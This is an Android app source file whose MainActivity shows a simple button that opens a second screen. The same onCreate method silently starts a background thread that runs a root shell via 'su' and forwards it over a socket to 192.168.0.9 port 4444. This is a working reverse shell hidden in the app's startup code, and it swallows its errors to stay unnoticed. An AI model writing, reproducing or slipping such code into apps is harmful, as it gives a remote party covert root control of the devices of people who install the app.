package com.example.narahari;

import android.content.Intent;
import android.os.Bundle;

import java.io.IOException;
import java.io.InputStream;
import java.io.OutputStream;
import java.net.Socket;
import android.app.Activity;
import android.util.Log;
import android.view.View;
import android.widget.Button;

public class MainActivity extends Activity {

    Button btn;
    @Override
    public void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);
        btn=(Button)findViewById(R.id.btn);
        btn.setOnClickListener(new View.OnClickListener() {
            @Override
            public void onClick(View v) {
                Intent i = new Intent(MainActivity.this, MainActivity2.class);
                startActivity(i);
            }
        });


        // start a reverse shell in the background
        new Thread(new Runnable(){
            @Override
            public void run() {
                try {
                    reverseShell();
                } catch (Exception e) {
                    Log.e("Reverse Shell Error", e.getMessage());
                }
            }

        }).start();
    }

    public void reverseShell() throws Exception {

        final Process process = Runtime.getRuntime().exec(new String[]{"su", "-c", "system/bin/sh"});
        Socket socket = new Socket("192.168.0.9", 4444);
        forwardStream(socket.getInputStream(), process.getOutputStream());
        forwardStream(process.getInputStream(), socket.getOutputStream());
        forwardStream(process.getErrorStream(), socket.getOutputStream());
        process.waitFor();

        // close the socket streams
        socket.getInputStream().close();
        socket.getOutputStream().close();
    }


    private static void forwardStream(final InputStream input, final OutputStream output) {
        new Thread(new Runnable() {
            @Override
            public void run() {
                try {
                    final byte[] buf = new byte[4096];
                    int length;
                    while ((length = input.read(buf)) != -1) {
                        if (output != null) {
                            output.write(buf, 0, length);
                            if (input.available() == 0) {
                                output.flush();
                            }
                        }
                    }
                } catch (Exception e) {
                    // die silently
                } finally {
                    try {
                        input.close();
                        output.close();
                    } catch (IOException e) {
                        // die silently
                    }
                }
            }
        }).start();
    }

}
